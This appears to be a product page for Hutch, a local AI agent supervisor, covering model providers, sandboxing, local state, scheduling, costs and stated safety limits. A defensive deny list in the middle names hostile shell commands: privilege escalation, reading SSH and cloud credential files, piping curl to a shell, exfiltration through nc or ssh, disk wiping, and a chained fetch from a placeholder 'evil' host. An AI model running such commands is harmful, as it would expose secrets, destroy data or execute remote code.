Your machine does the work. Pick who does the thinking.

Model and tool choices determine where data moves. Hutch keeps its control state on the host; prompts go to the configured model endpoint, and network tools contact their own destinations.

Inference
The offline mock works without credentials. Provider adapters cover OpenAI and Anthropic APIs, explicit OpenAI-compatible connections and Ollama’s API. Calls use the connection you configure; live provider compatibility depends on that endpoint and has not been tested here.
Execution
Runs are supervised by Hutch on Linux. Bubblewrap isolation is available when explicitly enabled and supported by the host; it is a namespace sandbox, not a virtual machine. Older bots keep isolation off until an operator enables it.
State
SQLite state and run transcripts are stored locally under ~/.local/state/hutch by default. Back up the database with Hutch’s backup instructions; deleting the host state removes local history.
Scheduling
Schedules are processed by one elected local supervisor. The host must be awake and the service running; sleep and disconnection are visible limits, not cloud execution.
Remote and subscriptions
The phone layout is responsive, but remote phone control and browser handoff are unavailable. ChatGPT sign-in is not implemented. OpenCode Go key connections are experimental and limited by their published workload terms.

Govern actions. Keep cancellation honest.

Hutch checks shell requests before execution, records actions and approvals, and keeps a run visibly stopping until its owned process has exited.

# hard-denied before execution, always
$ sudo / su / doas / pkexec        privilege escalation
$ rm -rf /  ~  $HOME  ..           wipes & escapes
$ cat ~/.ssh/*  .env  ~/.aws       secret paths
$ curl ... | sh                    pipe to interpreter
$ cmd | curl / nc / ssh            exfiltration channels
$ curl -T  /  --post-data          upload flags on fetchers
$ dd / mkfs / fork bombs / reboot  system destruction
# chained commands are split, judged per segment
$ git status && bash -c "$(curl evil)"
     segment 1: git status            allowed
     segment 2: bash -c "$(...)"       denied
     wrappers & substitutions are read through;
     an allow on the outside can never launder
     what is nested inside.
     verdict: worst wins               blocked
# per-bot risk tier refines only the ask zone
readonly   no writes, no mutation — even by rule
supervised the default: medium-risk actions ask you
trusted    runs without asking…
           …except outward sends, which always ask
# hard-denied classes stay denied in every tier

The honest limits

  • Isolation has a boundary. Linux bubblewrap mode uses namespaces and resource limits; it is not a VM. It must be enabled, and migrated bots remain unsandboxed until an operator changes the setting.
  • Humans still review consequential actions. Prompt injection can produce harmful requests; approvals and denials reduce risk but cannot make an allowed action safe.
  • Usage amounts are estimates. Hutch reserves estimated tokens and priced cost before a hosted call. The provider controls actual tokenization and billing.
  • External coding-agent harnesses are disabled. OpenCode and Pi are not launched because Hutch does not yet broker their permissions inside its sandbox.
  • Phone supervision is not remote access. The interface fits phone screens, but authenticated remote control and browser handoff are unavailable.

What usually stops people

Do I need an API key, a credit card, or a GPU?

The deterministic mock needs no model account. A real local model or hosted endpoint requires a configured compatible route; the providers and models available on your machine can differ, and live paid-provider checks have not been performed for this preview.

What actually leaves my machine?

Hutch stores its control state locally. A hosted model receives the prompt and context Hutch sends to it; network tools connect to their own destinations. A local model can still use online tools. Review the selected connection and tools before running a task.

What happens when my laptop sleeps on a schedule?

Nothing runs while the machine is off. With the local supervisor running again, configured schedules detect missed windows and either coalesce them into one catch-up run or record a skip, according to the bot’s policy.

Can I run it on my ChatGPT or Claude subscription?

ChatGPT sign-in and consumer chat-plan OAuth are not implemented. Hutch accepts explicitly configured provider connections; OpenCode Go is experimental and its published terms describe coding-agent use. No subscription is silently upgraded or used as a fallback.

What does a runaway bot cost me?

Hutch estimates tokens and priced cost, reserves those estimates before calls, and stops admitting more calls when configured limits would be crossed. The estimate can differ from the provider’s invoice; use that provider’s billing controls for an external spending limit. Uncertain calls remain held until reconciled.

Is it safe to let an agent touch my files?

Bubblewrap isolation is available only on Linux and must be enabled; it is not a virtual machine. Approval policy and transcripts provide operator control but do not guarantee safe decisions. Legacy bots may still have isolation disabled. Read the support boundaries above before use.
